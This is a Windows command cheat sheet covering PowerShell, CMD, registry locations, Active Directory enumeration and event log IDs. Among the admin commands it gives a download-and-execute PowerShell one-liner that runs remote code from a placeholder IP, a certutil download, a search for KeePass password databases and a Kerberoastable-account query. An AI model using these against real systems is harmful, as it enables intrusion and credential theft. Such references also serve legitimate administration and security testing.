# Index

- [Powershell](#Powershell)
- [CMD](#cmd)
- [Register Goldmine](#RegisterGoldmine)
- [Powershell ActiveDirectory](#PowershellActiveDirectory)
- [Others](#Others)

# Powershell

- **Powershell version**
	- `$PSVersionTable`
- **PS modules available**
	- `Get-Module -ListAvailable`
- **Get Cmd-Let from alias**
	- `Get-Alias <alias>`
- **Get alias from Cmd-Let**
	- `Get-Alias -Definition <Cmdlet>`
- **Local users**
	- `Get-LocalUser`
- **Local groups**
	- `Get-LocalGroup`
- **Members of a local group**
	- `Get-LocalGroupMember -Name <group name>`
- **Guest account status**
	- `Get-WmiObject Win32_UserAccount -filter "LocalAccount=True AND Name='Guest'" | Select-Object Domain,Name,Disabled`
- **Process list**
	- `Get-Process`
- **Operating system info**
	- `Get-ComputerInfo`
- **Hostfixes installed**
	- `Get-HotFix`
- **Scheduled tasks**
	- `Get-ScheduledTask`
- **File number in current directory**
	- `(Get-ChildItem | Measure-Object).Count`
- **Directories in the current directory**
	- `Get-ChildItem -Directory` 
- **Recursive file search**
	- `Get-ChildItem -Path <path> -recurse`
- **Recursive search only for hidden files**
	- `Get-ChildItem -Path <path> -hidden -recurse`
- **Recursive search including hidden files**
	- `Get-ChildItem -Path <path> -Recurse -File -Force -ErrorAction SilentlyContinue`
- **Recursive search for files that contain a string in the filename**
	- `Get-ChildItem -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.FullName -match '<term>' }`
- **Recursive search for directories that contain a string in the filename**
	- `Get-ChildItem -Recurse -Directory -Force -ErrorAction SilentlyContinue | Where-Object { $_.FullName -match '<term>' }`
- **Recursively search for files of a specific extension**
	- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
- **File info from all streams**
	- `Get-Item <path> -Stream *`
- **Alternative stream content of a file**
	- `Get-Content <path> -Stream <nome stream>`
- **Unique words in a file**
	- `Get-Content <file> | sort | Get-Unique`
- **N-th word of a file**
	- `(Get-Content <path>).Split()[(N-1)]`
- **Matching exact word**
	- `(Get-Content <file>).Split()  | Select-String -Pattern '^<word>'`
- **First N raw bytes of a file**
	- `(Get-Content <path> -Encoding byte)[0..N]`
- **Record A (IP address) of a domain**
	- `Resolve-DnsName <domain>`
- **DNS zone aging**
	- `Get-DnsServerZoneAging -Name <zone_name>`
- **All DNS records of a zone**
	- `Get-DnsServerResourceRecord -ZoneName <zone_name>`
- **Base64 encoding of a string**
	- `[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($var))`
- **Base64 decoding of a string**
	- `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($var))`
- **AppLocker policy**
	- `Get-AppLockerPolicy -Effective -Xml`
- **Service List**
	- `Get-Service`
	- `Get-WmiObject -Class Win32_Service -Filter "name='string'"`
- **DCOM application search with filter**
	- `Get-WmiObject -class "Win32_DCOMApplication" -Filter "AppId='{<APP ID VALUE>}'"`
- **Firewall rules**
	- `Get-NetFirewallRule`
- **Differences between files**
	- `Compare-Object -ReferenceObject $(Get-Content <ref_path_file>) -DifferenceObject $(Get-Content <diff_path_file>)`
- **Permissions on files and directories**
	- `Get-Acl <file/directory>`
- **Shares**
	- `Get-SmbShare`
- **Timezone**
	- `Get-TimeZone`
- **MD5 of a file**
	- ` Get-FileHash <pathfile> -Algorithm MD5`
- **Key of a register**
	- `Get-Item -Path '<path registry key>'`
- **Property of a registry key**
	- `Get-ItemProperty -Path '<path registry key>'`
- **Search key recursively**
	- `Get-ChildItem 'HKCU:\*' -Recurse -ErrorAction SilentlyContinue | findstr <filter>`
- **Download file**
	- `(New-Object System.Net.WebClient).DownloadFile('http://<IP>/<file>', '<output>')`
- **Download and Execute (no saving)**
	- `Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://<IP>/<file>')`
- **CMD command from powershell**
	- `cmd.exe /c "<command>"`
- **.NET versions installed**
	- `Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version`

# CMD

- **Local users**
	- `net user`
- **User info**
	- `net user <localuser>`
- **Local groups**
	- `net localgroup`
- **Members of a local group**
	- `net localgroup <group name>`
- **Guest account status**
	- `net user guest`
- **Process list**
	- `tasklist`
- **Permissions on files and directories**
	- `icacls <file/directory>`
- **Directory hierarchy**
	- `tree <path>`
- **Operating system and system information**
	- `systeminfo`
- **Hostfixes installed**
	- `systeminfo` o `wmic qfe list`
- **scheduled tasks**
	- `schtasks`
- **Environment variables**
	- `set`
- **Update environment variables (current session)**
	- `set PATH=%PATH%;C:\your\path\`
- **Services list**
	- `net start`
	- `sc queryex type=service state=all`
- **Take ownership file**
	- `takeown /f "<filepath>" && icacls "<filepath>" /grant <user group>:F`
- **Recursive search only for hidden files**
	- `dir /s /a:h | findstr /i "term"`
- **System reboot**
	- `shutdown /r /t 0`
- **Touch file**
	- `type nul >>file & copy file +,,`
- **Download file**
	- `certutil.exe -urlcache -f http://<IP>/<file> <output>`
- **Powershell command from CMD**: `powershell.exe "<command>"`
- **Kerberoastable users**
	- `setspn.exe -Q */*`
- **Register**:
	- **Key of a register (ex.)**
		- `reg query HKLM\SYSTEM\CurrentControlSet\Services`
	- **Property of a registry key**
		- `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDrive`
	- **Hierarchy of a property**
		- `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\ /s`

# RegisterGoldmine

- **Programs that are automatically started after login**:
	- `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`
	- `HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce`
	- `HKLM:\Software\Microsoft\Windows\CurrentVersion\Run`
	- `HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- **All Windows services**
	- `HKLM:\SYSTEM\CurrentControlSet\Services\` (a registry key for each service)
- **Registered owner**
	- `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\RegisteredOwner`
- **Internet Explorer URLs History**
	- `HKCU:\Software\Microsoft\Internet Explorer\TypedURLs`
- **Drive Mapping**
	- `HKCU:\Network\` (a registry key for each mapping)
- **List remote computers with one has established an RDP connection**
	- `HKCU:\Software\Microsoft\Terminal Server Client\*`
	- **List of the last 10 connections**
		- `HKCU:\Software\Microsoft\Terminal Server Client\Default`
	- **List of all connections established by the user**
		- `HKCU:\Software\Microsoft\Terminal Server Client\Servers\*`
- **Image File Execution Options**
	- `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*`
- **CLSID**
	- `HKCR:\CLSID\` (a registry key for each one)
- **.NET versions installed**
	- `HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP`

# PowershellActiveDirectory

- **Domain name**
	- `(Get-ADDomain).Name`
- **Description of computer designated as DC**
```powershell
$computername=(Get-ADDomainController).Name
Get-ADComputer $computername -Properties * | select Description
```
- **Am I on a Domain Controller?**:
```powershell
# get IPv4 Address
ipconfig
(Get-ADDomainController).IPv4Address
```
- **User search with filter**
	- `Get-ADUser -Identity <user>`
- **User search with multifilter**
	- `Get-ADUser -Filter 'logonHours -Like "*" -and Surname -Like "*"' -Properties *`
- **Active Directory Group Infromation**
	- `Get-ADGroup -Identity <groupname>`
- **Workstations that a user can access**
	- `(Get-ADUser <user> -Properties *).userWorkstations`
- **OU list**
	- `Get-ADOrganizationalUnit -Properties * -Filter * | where {$_.ProtectedFromAccidentalDeletion -eq $False}`
- **OU list with associated GPOs**
	- `Get-ADOrganizationalUnit -Filter * | where {-Not $_.LinkedGroupPolicyObjects} | Select Name, LinkedGroupPolicyObjects`
- **GPO list**
	- `Get-GPO -All -Domain "<domain name>"`
- **Trusted domains**
	- `Get-ADTrust -Filter *`

# Others
- **IIS log - default location**
	- `C:\inetpub\logs\LogFiles`
- **Windows host file**
	- `C:\Windows\System32\Drivers\etc\hosts`
- **Last program executed (one option)**
	- `C:\Windows\Prefetch`
- **AppData directory (hidden)**
	- `C:\Users\<username>\AppData\`
- **Program Files**:
	- `C:\Program Files`: directories for programs in the native bitness of the system
	- `C:\Program Files (x86)`: directory for x86 programs (32 bit)
- **Event Log ID**:
	- audit log deleted: **1102**
	- created a global group: **4727**
	- user added to a group: **4728**
	- scheduled task deletion: **4699**
	- login successfully: **4624**
	- user enabled: **4722**
	- user created:**4720**